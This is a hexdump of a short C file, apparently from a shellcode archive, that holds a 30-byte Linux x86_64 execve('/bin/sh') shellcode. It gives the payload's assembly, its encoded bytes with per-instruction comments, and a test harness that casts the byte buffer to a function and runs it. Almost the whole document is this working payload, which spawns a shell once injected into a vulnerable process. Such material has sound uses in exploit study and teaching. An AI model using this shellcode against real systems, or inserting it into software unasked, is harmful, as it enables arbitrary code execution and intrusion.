00000000  23 20 4c 69 6e 75 78 2f  78 38 36 5f 36 34 20 65  |# Linux/x86_64 e|
00000010  78 65 63 76 65 28 22 2f  62 69 6e 2f 73 68 22 29  |xecve("/bin/sh")|
00000020  3b 20 33 30 20 62 79 74  65 73 20 73 68 65 6c 6c  |; 30 bytes shell|
00000030  63 6f 64 65 0a 23 20 44  61 74 65 3a 20 32 30 31  |code.# Date: 201|
00000040  30 2d 30 34 2d 32 36 0a  23 20 41 75 74 68 6f 72  |0-04-26.# Author|
00000050  3a 20 7a 62 74 0a 23 20  54 65 73 74 65 64 20 6f  |: zbt.# Tested o|
00000060  6e 3a 20 78 38 36 5f 36  34 20 44 65 62 69 61 6e  |n: x86_64 Debian|
00000070  20 47 4e 55 2f 4c 69 6e  75 78 0a 20 0a 2f 2a 0a  | GNU/Linux. ./*.|
00000080  20 20 20 20 3b 20 65 78  65 63 76 65 28 22 2f 62  |    ; execve("/b|
00000090  69 6e 2f 73 68 22 2c 20  5b 22 2f 62 69 6e 2f 73  |in/sh", ["/bin/s|
000000a0  68 22 5d 2c 20 4e 55 4c  4c 29 0a 20 0a 20 20 20  |h"], NULL). .   |
000000b0  20 73 65 63 74 69 6f 6e  20 2e 74 65 78 74 0a 20  | section .text. |
000000c0  20 20 20 20 20 20 20 20  20 20 20 67 6c 6f 62 61  |           globa|
000000d0  6c 20 5f 73 74 61 72 74  0a 20 0a 20 20 20 20 5f  |l _start. .    _|
000000e0  73 74 61 72 74 3a 0a 20  20 20 20 20 20 20 20 20  |start:.         |
000000f0  20 20 20 78 6f 72 20 20  20 20 20 72 64 78 2c 20  |   xor     rdx, |
00000100  72 64 78 0a 20 20 20 20  20 20 20 20 20 20 20 20  |rdx.            |
00000110  6d 6f 76 20 20 20 20 20  71 77 6f 72 64 20 72 62  |mov     qword rb|
00000120  78 2c 20 27 2f 2f 62 69  6e 2f 73 68 27 0a 20 20  |x, '//bin/sh'.  |
00000130  20 20 20 20 20 20 20 20  20 20 73 68 72 20 20 20  |          shr   |
00000140  20 20 72 62 78 2c 20 30  78 38 0a 20 20 20 20 20  |  rbx, 0x8.     |
00000150  20 20 20 20 20 20 20 70  75 73 68 20 20 20 20 72  |       push    r|
00000160  62 78 0a 20 20 20 20 20  20 20 20 20 20 20 20 6d  |bx.            m|
00000170  6f 76 20 20 20 20 20 72  64 69 2c 20 72 73 70 0a  |ov     rdi, rsp.|
00000180  20 20 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |            push|
00000190  20 20 20 20 72 61 78 0a  20 20 20 20 20 20 20 20  |    rax.        |
000001a0  20 20 20 20 70 75 73 68  20 20 20 20 72 64 69 0a  |    push    rdi.|
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
000001c0  20 20 20 20 72 73 69 2c  20 72 73 70 0a 20 20 20  |    rsi, rsp.   |
000001d0  20 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |         mov    |
000001e0  20 61 6c 2c 20 30 78 33  62 0a 20 20 20 20 20 20  | al, 0x3b.      |
000001f0  20 20 20 20 20 20 73 79  73 63 61 6c 6c 0a 2a 2f  |      syscall.*/|
00000200  0a 20 0a 69 6e 74 20 6d  61 69 6e 28 76 6f 69 64  |. .int main(void|
00000210  29 0a 7b 0a 20 20 20 20  63 68 61 72 20 73 68 65  |).{.    char she|
00000220  6c 6c 63 6f 64 65 5b 5d  20 3d 0a 20 20 20 20 22  |llcode[] =.    "|
00000230  5c 78 34 38 5c 78 33 31  5c 78 64 32 22 20 20 20  |\x48\x31\xd2"   |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000250  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000260  2f 20 78 6f 72 20 20 20  20 25 72 64 78 2c 20 25  |/ xor    %rdx, %|
00000270  72 64 78 0a 20 20 20 20  22 5c 78 34 38 5c 78 62  |rdx.    "\x48\xb|
00000280  62 5c 78 32 66 5c 78 32  66 5c 78 36 32 5c 78 36  |b\x2f\x2f\x62\x6|
00000290  39 5c 78 36 65 5c 78 32  66 5c 78 37 33 5c 78 36  |9\x6e\x2f\x73\x6|
000002a0  38 22 20 20 20 20 20 20  2f 2f 20 6d 6f 76 09 24  |8"      // mov.$|
000002b0  30 78 36 38 37 33 32 66  36 65 36 39 36 32 32 66  |0x68732f6e69622f|
000002c0  32 66 2c 20 25 72 62 78  0a 20 20 20 20 22 5c 78  |2f, %rbx.    "\x|
000002d0  34 38 5c 78 63 31 5c 78  65 62 5c 78 30 38 22 20  |48\xc1\xeb\x08" |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002f0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000300  73 68 72 20 20 20 20 24  30 78 38 2c 20 25 72 62  |shr    $0x8, %rb|
00000310  78 0a 20 20 20 20 22 5c  78 35 33 22 20 20 20 20  |x.    "\x53"    |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000340  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
00000350  25 72 62 78 0a 20 20 20  20 22 5c 78 34 38 5c 78  |%rbx.    "\x48\x|
00000360  38 39 5c 78 65 37 22 20  20 20 20 20 20 20 20 20  |89\xe7"         |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000380  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 20  |         // mov |
00000390  20 20 20 25 72 73 70 2c  20 25 72 64 69 0a 20 20  |   %rsp, %rdi.  |
000003a0  20 20 22 5c 78 35 30 22  20 20 20 20 20 20 20 20  |  "\x50"        |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000003d0  20 20 2f 2f 20 70 75 73  68 20 20 20 25 72 61 78  |  // push   %rax|
000003e0  0a 20 20 20 20 22 5c 78  35 37 22 20 20 20 20 20  |.    "\x57"     |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000410  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 25  |     // push   %|
00000420  72 64 69 0a 20 20 20 20  22 5c 78 34 38 5c 78 38  |rdi.    "\x48\x8|
00000430  39 5c 78 65 36 22 20 20  20 20 20 20 20 20 20 20  |9\xe6"          |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000450  20 20 20 20 20 20 20 20  2f 2f 20 6d 6f 76 20 20  |        // mov  |
00000460  20 20 25 72 73 70 2c 20  25 72 73 69 0a 20 20 20  |  %rsp, %rsi.   |
00000470  20 22 5c 78 62 30 5c 78  33 62 22 20 20 20 20 20  | "\xb0\x3b"     |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000004a0  20 2f 2f 20 6d 6f 76 20  20 20 20 24 30 78 33 62  | // mov    $0x3b|
000004b0  2c 20 25 61 6c 0a 20 20  20 20 22 5c 78 30 66 5c  |, %al.    "\x0f\|
000004c0  78 30 35 22 3b 20 20 20  20 20 20 20 20 20 20 20  |x05";           |
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004e0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 73 79 73  |          // sys|
000004f0  63 61 6c 6c 0a 20 0a 20  20 20 20 28 2a 28 76 6f  |call. .    (*(vo|
00000500  69 64 20 28 2a 29 28 29  29 20 73 68 65 6c 6c 63  |id (*)()) shellc|
00000510  6f 64 65 29 28 29 3b 0a  20 20 20 20 20 0a 20 20  |ode)();.     .  |
00000520  20 20 72 65 74 75 72 6e  20 30 3b 0a 7d           |  return 0;.}|
0000052d
